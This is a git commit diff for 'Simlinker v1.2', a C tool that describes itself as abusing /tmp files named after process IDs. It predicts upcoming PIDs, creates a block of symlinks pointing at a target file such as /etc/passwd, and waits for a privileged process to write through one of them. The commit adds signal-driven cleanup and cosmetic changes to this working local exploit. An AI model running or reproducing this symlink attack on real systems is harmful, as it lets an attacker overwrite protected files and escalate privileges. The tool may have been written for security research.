8a878ea0bce5260f32e11d448f4f955d4fd12663
Larry Cashdollar <larry0@me.com>
2019-11-04 09:58:53 -0500

    Added signal handlding

--- main.c
+++ main.c
@@ -8,6 +8,7 @@
 #include <dirent.h>
 #include <strings.h>
 #include <time.h>
+#include <signal.h>
 
 /*
 #Symlink creator to abuse files creation in /tmp where the pid is used in the filename.  
@@ -28,37 +29,41 @@ extern char *optarg;
 int scan_big (int *a, int n);
 int get_latest_pid (void);
 void unlink_files (files * fstruc);
-char *parse (char *string,int p);
+static void sigterm (int sig);
 
 #ifdef IRIX
-	#define PROC "/proc/pinfo"
+#define PROC "/proc/pinfo"
 char *strsep (char **stringp, const char *delim);
 #endif
 
 #ifdef SOLARIS
-	#define PROC "/proc"
+#define PROC "/proc"
 #endif
 
+files *file_list, *tmp, *start;
 
 int
 main (int argc, char **argv)
 {
   int x = 0, from = 0, errflg = 0, to = 0, result = 0, i = 0, pid = 0, ch = 0;
-  char dest_name[MAXSIZE], from_name[MAXSIZE],tmp_name[MAXSIZE], start_time[26], *buffer,*s;
+  char dest_name[MAXSIZE], from_name[MAXSIZE], tmp_name[MAXSIZE],
+    start_time[26], *buffer, *s;
   struct stat buf;
-  files *file_list, *tmp, *start;
   time_t t_time_watch, t_time;
 
+  signal (SIGTERM, sigterm);
+  signal (SIGINT, sigterm);
+  signal (SIGHUP, sigterm);
   //latest pid read from PROC + 1 
-  from = (get_latest_pid ()) +1;
+  from = (get_latest_pid ()) + 1;
 
   if (argc < 4)
     {
 
-      printf ("####            Simlinker v1.2          ####\n\n\nLarry W. Cashdollar\nOct/2019\n\n");
-      printf ("Usage: %s -n # symlinks -f from_file -t to_file\n",
-	 argv[0]);
-      printf ("e.g. %s -n 100 dos_unix /etc/passwd\n\n",argv[0]);
+      printf
+	("####            Simlinker v1.2          ####\n\n\nLarry W. Cashdollar\nOct/2019\n\n");
+      printf ("Usage: %s -n # symlinks -f from_file -t to_file\n", argv[0]);
+      printf ("e.g. %s -n 100 dos_unix /etc/passwd\n\n", argv[0]);
       return (0);
     }
 
@@ -79,7 +84,8 @@ main (int argc, char **argv)
       }
   if (errflg)
     {
-      fprintf (stderr,"Usage: %s -n # symlinks -f from_file -t to_file\n",argv[0]);
+      fprintf (stderr, "Usage: %s -n # symlinks -f from_file -t to_file\n",
+	       argv[0]);
       return (0);
     }
 
@@ -87,10 +93,10 @@ main (int argc, char **argv)
   //init our link list
   file_list = malloc (sizeof (files));
   start = file_list;
-  bzero(file_list->filename,MAXSIZE);
+  bzero (file_list->filename, MAXSIZE);
   file_list->next = NULL;
 
-  printf ("Starting from lastest process id read from %s: %d\n", PROC,from);
+  printf ("Starting from lastest process id read from %s: %d\n", PROC, from);
 
 
   i = stat (dest_name, &buf);
@@ -105,15 +111,15 @@ main (int argc, char **argv)
 
   t_time_watch = buf.st_mtim.tv_sec;
   //Create our block of symlinks that we hope root will write too.
-      printf ("Symlinking ");
+  printf ("[+] Symlinking ");
   buffer = from_name;
   s = strsep (&buffer, "#");
   for (x = from; x < to; x++)
     {
-  snprintf (tmp_name, 256, "%s%d%s", s, x, buffer);
+      snprintf (tmp_name, 256, "%s%d%s", s, x, buffer);
       printf ("%s->%s ", tmp_name, dest_name);
       tmp = malloc (sizeof (files));
-      strncpy (tmp->filename, tmp_name,MAXSIZE);
+      strncpy (tmp->filename, tmp_name, MAXSIZE);
       tmp->next = file_list->next;
       file_list->next = tmp;
 
@@ -128,7 +134,7 @@ main (int argc, char **argv)
 
 
   printf
-    ("\nWaiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
+    ("\n[+] Waiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
 // Watch the target file to see if it's over written and check to see if the newest process pid
 // is larger than our biggest predicted pid.  If so exit because we failed.
   while (t_time == t_time_watch)
@@ -139,7 +145,7 @@ main (int argc, char **argv)
       if (pid >= to)
 	{
 	  printf
-	    ("Failed: The next pid %d will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n",
+	    ("[-] Failed: The next pid %d will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n",
 	     pid);
 	  unlink_files (start);
 	  exit (1);
@@ -200,8 +206,8 @@ unlink_files (files * fstruc)
   tmp = fstruc;
   fstruc = fstruc->next;
   free (tmp);
-  printf ("Cleaning up....\n");
-      printf ("Unlinking ");
+  printf ("[+] Cleaning up....\n");
+  printf ("Unlinking ");
   while (fstruc)
     {
       tmp = fstruc;
@@ -210,38 +216,16 @@ unlink_files (files * fstruc)
       fstruc = fstruc->next;
       free (tmp);
     }
-printf("\n");
+  printf ("\n");
 }
 
-
-
-
-
-/*int
-main (int argc, char **argv)
+static void
+sigterm (int sig)
 {
-
-  char *temp = NULL;
-
-  temp = parse (argv[1]);
-  printf ("%s\n", temp);
-  free (temp);
-  return (0);
-}*/
-
-
-/*char *
-parse (char *string,int p)
-{
-  char buffer[256];
-  char *s, *new;
-  new = malloc (sizeof (char) * 256);
-  s = strsep (&string, "#");
-  strncpy (buffer, string, 256);
-  snprintf (new, 256, "%s%d%s", s, p, buffer);
-  printf("%s",new);
-  return (new);
-}*/
+  fprintf (stderr, "\n[+] Signal %d received. Exiting...\n", sig);
+  unlink_files (start);
+  exit (EXIT_SUCCESS);
+}
 
 #ifdef IRIX
 char *
